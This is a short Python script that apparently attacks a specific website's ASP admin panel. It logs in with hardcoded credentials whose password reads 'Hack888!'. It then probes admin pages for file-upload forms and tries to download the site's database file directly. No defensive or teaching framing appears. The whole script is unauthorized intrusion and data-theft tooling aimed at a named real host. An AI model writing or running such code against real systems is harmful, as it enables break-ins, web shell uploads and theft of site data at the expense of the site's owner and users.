import requests, re

s = requests.Session()
s.get("http://bjhzsv.com/main/", timeout=10)
s.post("http://bjhzsv.com/main/a7chkuser.asp",
    data={"t1": "hermes", "t2": "Hack888!", "t3": "1234"},
    headers={"Referer": "http://bjhzsv.com/main/"}, timeout=10)

pages = [
    "menu_add2.asp", "menu_add2.asp?action=add", "menu_add.asp",
    "menu_add.asp?action=add", "ly2_re.asp",
    "admin_in.asp?action=add", "config_in.asp?action=siteinfo1",
]

for p in pages:
    r = s.get("http://bjhzsv.com/main/" + p, timeout=5)
    t = r.content.decode("gb2312", errors="replace")
    has_file = "file" in t.lower() or 'type="file"' in t.lower()
    has_form = "<form" in t.lower()
    title = ""
    m = re.search(r"<title>([^<]+)", t)
    if m: title = m.group(1)
    print("=" * 60)
    print("PAGE: %s | Size: %d | Title: %s | File: %s | Form: %s" % (p, len(t), title, has_file, has_form))
    if len(t) > 100 and len(t) < 3000:
        print(t[:800])
    elif len(t) > 100:
        print(t[:300])
        print("... [truncated, %d total]" % len(t))

# Also try to access the database directly
print("=" * 60)
r = s.get("http://bjhzsv.com/main/data/db.mdb", timeout=10)
print("DB size: %d" % len(r.content))
